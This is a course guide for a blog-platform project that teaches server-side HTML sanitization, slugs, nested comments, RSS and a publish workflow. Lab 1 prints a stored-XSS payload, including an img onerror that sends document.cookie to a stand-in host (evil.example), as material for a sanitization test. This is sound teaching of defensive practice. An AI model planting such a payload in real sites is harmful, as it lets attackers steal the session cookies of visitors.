# FABLE Guide — Blog Platform

**Project 7: user-authored content, done safely.** The theme is the most dangerous
boundary in web development: **storing HTML that users wrote and rendering it to other
users.** Around it: rich-text editor wiring, slug generation, nested comments, and RSS.
Get the sanitization story wrong and everything else is decoration — this project
exists so you get it wrong here, on seed data, instead of in production.

Like Projects 4 and 6, this is a working scaffold plus build-labs.

---

## 1. What you get vs. what you build

**You get:** a TypeScript Express + Knex API for `posts` (list/search/stats/CRUD,
standard envelope) and a one-page React client — the same six-file scaffold shape as
Projects 4, 6, and 8–10 (`routes.ts` → `controller.ts` → `service.ts` → `model.ts`).

**You build:**

| Upgrade | The lesson inside it |
|---|---|
| Rich-text editing + sanitization | Where exactly the trust boundary sits (spoiler: the server, on write AND the render path). |
| Slugs | Deriving URLs from titles: uniqueness, collisions, and what happens when a title changes after publication. |
| Nested comments | Modeling a tree in SQL (`parent_id`), fetching it efficiently, rendering it recursively. |
| RSS feed | Content negotiation — the same data as XML, and why standards-formatted output is fussier than JSON. |
| Draft → published workflow | The `status` column grows teeth: visibility rules per status. |

**Stack:** React 18 + Vite + TypeScript / Express + Knex + PostgreSQL.
API on **:4107**, client on :5173.

## 2. Run it (10 minutes)

```bash
createdb blog_platform_dev
cd 07-blog-platform && cp .env.example .env && cd server   # server/src/config/env.ts loads ../.env
npm install && npm run migrate && npm run seed && npm run dev
# another terminal
cd 07-blog-platform/client && npm install && npm run dev
```

```bash
curl "http://localhost:4107/api/posts?status=published"
curl "http://localhost:4107/api/posts/stats"
```

Scaffold tour: 20 minutes, same reading order as Project 6 §3 — routes, `service.ts`
(allow-listed fields, id parsing), `model.ts` (note the `orWhereILike` search
over four columns, unescaped), the migration, then `client/src/App.tsx`.

## 3. The labs

### Lab 1 — The sanitization boundary (mid) — the headline lab
Give posts an HTML `body` (a textarea accepting raw HTML is enough to start; wire a
real editor like TipTap afterward if you want the frontend practice). Then make this
post harmless:

```html
<p>Nice post!</p><script>document.title='owned'</script>
<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
<a href="javascript:alert(1)">click</a>
```

Rules of the lab:
1. Sanitize **on the server** with an allow-list library (`sanitize-html` /
   `dompurify`+jsdom) — decide *when*: on write (store clean) vs. on read (store raw,
   clean at render). Implement one; write 5 lines on the other's trade-off
   (re-sanitizing old data when the policy tightens is the key point).
2. The React client must render post bodies with `dangerouslySetInnerHTML` — that name
   is the curriculum. Explain why React's default escaping can't help you here.
3. Write the test: POST the payload above, GET it back, assert no `<script>`, no
   `onerror`, no `javascript:` href survived.

### Lab 2 — Slugs (junior→mid)
`title: "My First Post!"` → `slug: "my-first-post"`, unique, immutable-by-default.
- Generation in the service (lowercase, strip diacritics/punctuation, hyphenate);
  uniqueness via suffix (`-2`) with a DB unique constraint as the backstop.
- Add `GET /api/posts/slug/:slug` and make the client link by slug.
- The design question you must answer in writing: *the title changes after the post is
  shared — does the slug change?* (Cool URIs don't change; if you re-slug, you owe a
  redirect from the old one.)

### Lab 3 — Nested comments (mid)
New `comments` table: `id, post_id, parent_id NULL, author_name, body, created_at`.
- Endpoints: create (with optional `parent_id`), list per post.
- Fetch the whole thread in **one query** and build the tree in the service —
  compare with the N+1 recursive-fetch approach you must *not* ship.
- Render recursively in React with an indentation cap and a depth limit at write time
  (reject nesting deeper than ~5; write down why unlimited depth is a product *and*
  security decision, not just style).
- Comment bodies are user content → they go through Lab 1's sanitizer too (or are
  rendered as plain text — choose and justify).

### Lab 4 — RSS + publish workflow (mid→senior)
- `GET /feed.xml`: latest 20 **published** posts as RSS 2.0. Hand-build the XML with
  proper escaping or use a tiny builder; validate against the W3C feed validator.
  Note what RSS forces on you that JSON never did: date format (RFC 822), CDATA/escaping
  rules, absolute URLs.
- Tighten `status`: `draft` posts must not appear in the public list, slug lookups, or
  the feed — but must appear to their author in an "all posts" admin view. List every
  query you had to touch; that sprawl is why real systems centralize visibility rules.
- **Senior memo (1 page):** "Where does sanitization belong long-term?" Cover: editor
  produces JSON (e.g. TipTap doc) vs. HTML, storing structured content and rendering
  HTML at the edge, and what you'd do when the mobile app arrives and wants the same
  content without HTML.

## 4. Questions you should be able to answer afterward

- Why is client-side sanitization alone worthless? Who is the attacker and who is the victim in stored XSS?
- Allow-list vs. deny-list sanitization — why does deny-listing always lose eventually?
- Why must the slug's uniqueness be enforced by the database even though the service checks first? (Race between two concurrent posts.)
- What are the two standard ways to store trees in SQL (`parent_id` adjacency list vs. materialized path), and why is adjacency list fine here?
- What changes in your API design when consumers include feed readers you don't control?

## 5. Common traps

- **Sanitizing then truncating:** cutting sanitized HTML at 200 chars for a preview can split a tag open and reintroduce injection. Truncate the *text*, not the HTML.
- **`encodeURIComponent` is not HTML-escaping** and HTML-escaping is not sanitizing. Three different tools; know which layer each belongs to.
- **Slug collisions under concurrency:** two "hello-world" posts submitted simultaneously both pass the service check; only the unique index saves you — handle its error.
- **RSS dates:** `new Date().toISOString()` is not RFC 822. Feed validators will tell you; run one.

Next: Project 8 (`08-kanban-board`) — client-heavy for the first time: drag-and-drop,
optimistic updates, and fractional ordering.
